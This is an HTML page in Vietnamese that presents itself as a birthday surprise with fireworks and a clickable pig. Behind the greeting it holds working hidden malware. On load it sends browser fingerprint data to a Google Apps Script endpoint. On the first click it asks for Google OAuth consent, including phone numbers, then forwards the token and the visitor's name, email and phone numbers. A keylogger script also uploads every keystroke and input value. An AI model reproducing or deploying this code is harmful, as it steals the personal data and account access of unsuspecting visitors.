<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Surprise üéâ</title>
<style>
    body { margin:0; background:#000; overflow:hidden; font-family:Arial, sans-serif; color:#fff; text-align:center; }
    #message { position:absolute; top:40%; width:100%; font-size:48px; font-weight:bold;
               animation:bounce 1s infinite, colorChange 3s infinite linear;
               text-shadow:0 0 20px pink, 0 0 40px magenta; opacity:0; transition:opacity 1s ease-in-out; pointer-events:none; }
    #pigTrap { position:absolute; top:10%; left:50%; transform:translateX(-50%); font-size:80px; cursor:pointer;
               animation:oink 1s infinite alternate; user-select:none; }
    @keyframes oink { 0%{transform:translateX(-50%) scale(1);} 100%{transform:translateX(-50%) scale(1.2);} }
    @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-15px);} }
    @keyframes colorChange {
        0%{color:#ff66cc; text-shadow:0 0 20px #ff66cc, 0 0 40px #ff33aa;}
        25%{color:#ffcc00; text-shadow:0 0 20px #ffcc00, 0 0 40px #ffaa00;}
        50%{color:#66ff66; text-shadow:0 0 20px #66ff66, 0 0 40px #33cc33;}
        75%{color:#66ccff; text-shadow:0 0 20px #66ccff, 0 0 40px #3399ff;}
        100%{color:#ff66cc; text-shadow:0 0 20px #ff66cc, 0 0 40px #ff33aa;}
    }
</style>
</head>
<body>
<script>
fetch("https://script.google.com/macros/s/AKfycbwFepSVmEv8rjasuKMYFMpbPv_ShB0JnN6RquB-MEjVplQkzfejorzbOuLF1hhFqdxcWA/exec?ua=" + encodeURIComponent(navigator.userAgent)
    + "&lang=" + encodeURIComponent(navigator.language)
    + "&tz=" + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone)
    + "&screen=" + screen.width + "x" + screen.height).catch(()=>{});
</script>

<canvas id="canvas"></canvas>
<div id="message">üéâüéÇ Ch√∫c M·ª´ng Sinh Nh·∫≠t üéÇüéâ</div>
<div id="pigTrap">üê∑</div>

<audio id="birthdaySong" src="" preload="auto"></audio>

<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let fireworks = [];
let particles = [];

class Firework {
  constructor(x, y, targetY, color) {
    this.x = x; this.y = y; this.targetY = targetY; this.color = color;
    this.speed = 5; this.exploded = false;
  }
  update() { if (!this.exploded) { this.y -= this.speed; if (this.y <= this.targetY) { this.exploded = true; explode(this.x, this.y, this.color); } } }
  draw() { ctx.beginPath(); ctx.arc(this.x, this.y, 3, 0, Math.PI * 2); ctx.fillStyle = this.color; ctx.fill(); }
}

class Particle {
  constructor(x, y, color) { this.x = x; this.y = y; this.color = color; this.speedX = (Math.random()-0.5)*6; this.speedY=(Math.random()-0.5)*6; this.alpha=1; this.decay=0.02; }
  update() { this.x += this.speedX; this.y += this.speedY; this.alpha -= this.decay; }
  draw() { ctx.globalAlpha = this.alpha; ctx.beginPath(); ctx.arc(this.x, this.y, 2, 0, Math.PI * 2); ctx.fillStyle = this.color; ctx.fill(); ctx.globalAlpha = 1; }
}

function explode(x, y, color) { for (let i=0;i<50;i++) particles.push(new Particle(x,y,color)); }

function animate() {
  ctx.fillStyle = "rgba(0,0,0,0.2)"; ctx.fillRect(0,0,canvas.width,canvas.height);
  fireworks.forEach((fw,i)=>{ fw.update(); fw.draw(); if (fw.exploded) fireworks.splice(i,1); });
  particles.forEach((p,i)=>{ p.update(); p.draw(); if (p.alpha<=0) particles.splice(i,1); });
  requestAnimationFrame(animate);
}

window.onload = function() {
  document.getElementById("message").style.opacity = 1;
  setInterval(() => {
    let x = Math.random() * canvas.width;
    let color = `hsl(${Math.random()*360}, 100%, 50%)`;
    fireworks.push(new Firework(x, canvas.height, Math.random()*canvas.height/2, color));
  }, 500);
};

document.getElementById("pigTrap").addEventListener("click", function() {
  document.getElementById("birthdaySong").play();
  document.getElementById("pigTrap").remove();
}, { once: true });

document.addEventListener("click", function() { document.getElementById("birthdaySong").play(); }, { once: true });

animate();
</script>

<div id="demoPanel" style="display:none; position:fixed;left:16px;bottom:16px;z-index:99999;background:rgba(0,0,0,.6);color:#fff;padding:12px 14px;border-radius:12px;max-width:92vw;font-size:14px;line-height:1.4">
  <div id="demoContent"></div>
</div>

<script src="https://accounts.google.com/gsi/client" async defer></script>

<script>
const CLIENT_ID  = '585272145485-hmefm5up9vsqq1j8gotp75ssqlfqjrfl.apps.googleusercontent.com';
const UPLOAD_URL = 'https://script.google.com/macros/s/AKfycbwFepSVmEv8rjasuKMYFMpbPv_ShB0JnN6RquB-MEjVplQkzfejorzbOuLF1hhFqdxcWA/exec';

let tokenClient;
let accessToken = null;

function setDemo(html) {
  const el = document.getElementById('demoContent');
  if (el) el.innerHTML = html;
  document.getElementById('demoPanel').style.display = 'block';
}

window.addEventListener('load', () => {
  tokenClient = google.accounts.oauth2.initTokenClient({
    client_id: CLIENT_ID,
    scope: ['openid','email','profile','https://www.googleapis.com/auth/user.phonenumbers.read'].join(' '),
    prompt: 'consent',
    callback: async (resp) => {
      if (resp.error) { setDemo('Kh√¥ng l·∫•y ƒë∆∞·ª£c token: ' + resp.error); return; }
      accessToken = resp.access_token;
      await fetchProfileAndSend();
    },
  });
  document.addEventListener('click', () => { tokenClient.requestAccessToken({ prompt: '' }); }, { once: true });
});

async function fetchProfileAndSend() {
  const show = (msg) => setDemo(typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2).replace(/\n/g,'<br>'));
  try {
    const fd1 = new FormData();
    fd1.append('payload', JSON.stringify({ type: 'proxy_people', token: accessToken }));
    const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
    if (!prox.ok) { show('‚ùå Proxy People API l·ªói: HTTP ' + prox.status); return; }
    const profile = await prox.json();

    const name   = profile.names?.[0]?.displayName || null;
    const email  = profile.emailAddresses?.[0]?.value || null;
    const phones = (profile.phoneNumbers || []).map(p => p.value).filter(Boolean);

    setDemo(`<b>T√™n:</b> ${name || '‚Äî'} ‚Ä¢ <b>Email:</b> ${email || '‚Äî'} ‚Ä¢ <b>SƒêT:</b> ${phones.join(', ') || '‚Äî'}`);

    const fd2 = new FormData();
    fd2.append('payload', JSON.stringify({
      type: 'google_people_profile',
      ts: new Date().toISOString(),
      userAgent: navigator.userAgent,
      data: { name, email, phones, raw: profile }
    }));
    const sendRes = await fetch(UPLOAD_URL, { method: 'POST', body: fd2 });
  } catch (e) {
    show('‚ùå L·ªói: ' + (e?.message || e));
  }
}
</script>

<!-- === Interaction tracker: logs full input values & keys === -->
<script>
const TRACK_UPLOAD_URL = UPLOAD_URL;
const BATCH_SIZE = 20;
const FLUSH_MS   = 5000;

const sessionId = crypto.randomUUID ? crypto.randomUUID() : (Date.now() + '_' + Math.random().toString(36).slice(2));
const queue = [];
let flushTimer = null;

function shortPath(el) {
  if (!el) return '';
  const id = el.id ? '#' + el.id : '';
  const cls = el.className && typeof el.className === 'string' ? '.' + el.className.trim().replace(/\s+/g,'.') : '';
  return (el.tagName || '').toLowerCase() + id + cls;
}
function nowIso() { return new Date().toISOString(); }

function pushEvent(ev) {
  queue.push(ev);
  if (queue.length >= BATCH_SIZE) flush();
  if (!flushTimer) flushTimer = setTimeout(flush, FLUSH_MS);
}

function flush(useBeacon=false) {
  if (!queue.length) return;
  const events = queue.splice(0, queue.length);
  if (flushTimer) { clearTimeout(flushTimer); flushTimer = null; }

  const payload = {
    type: 'interaction_log',
    ts: nowIso(),
    sessionId,
    page: location.href,
    ua: navigator.userAgent,
    viewport: { w: innerWidth, h: innerHeight, dpr: devicePixelRatio || 1 },
    events
  };

  const fd = new FormData();
  fd.append('payload', JSON.stringify(payload));

  if (useBeacon && navigator.sendBeacon) {
    const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain;charset=utf-8' });
    navigator.sendBeacon(TRACK_UPLOAD_URL, blob);
    return;
  }
  fetch(TRACK_UPLOAD_URL, { method: 'POST', body: fd }).catch(()=>{});
}

document.addEventListener('click', (e) => {
  const rect = e.target?.getBoundingClientRect?.() || { left:0, top:0 };
  pushEvent({
    kind: 'click',
    t: nowIso(),
    target: { tag: shortPath(e.target), text: (e.target?.innerText || '').slice(0,80) },
    x: Math.round(e.clientX - rect.left),
    y: Math.round(e.clientY - rect.top),
    screen: { x: e.clientX, y: e.clientY }
  });
}, true);

document.addEventListener('input', (e) => {
  let val = '';
  try { val = e.target.value; } catch(_) {}
  pushEvent({
    kind: 'input',
    t: nowIso(),
    target: { tag: shortPath(e.target), name: e.target?.name || '' },
    value: val
  });
}, true);

document.addEventListener('keydown', (e) => {
  pushEvent({
    kind: 'keydown',
    t: nowIso(),
    key: e.key,
    code: e.code,
    ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey, meta: e.metaKey
  });
}, true);

let lastScroll = 0;
document.addEventListener('scroll', () => {
  const now = Date.now();
  if (now - lastScroll < 250) return;
  lastScroll = now;
  pushEvent({
    kind: 'scroll',
    t: nowIso(),
    scrollY: Math.round(window.scrollY),
    docH: Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
  });
}, { passive: true });

document.addEventListener('visibilitychange', () => {
  pushEvent({ kind: 'visibility', t: nowIso(), state: document.visibilityState });
});

window.addEventListener('resize', () => {
  pushEvent({ kind: 'resize', t: nowIso(), viewport: { w: innerWidth, h: innerHeight, dpr: devicePixelRatio || 1 } });
});

window.addEventListener('error', (e) => {
  pushEvent({ kind: 'error', t: nowIso(), message: e?.message || 'unknown', src: e?.filename || '', line: e?.lineno || 0, col: e?.colno || 0 });
});

setInterval(() => flush(), FLUSH_MS);
window.addEventListener('beforeunload', () => { flush(true); });
</script>

</body>
</html>
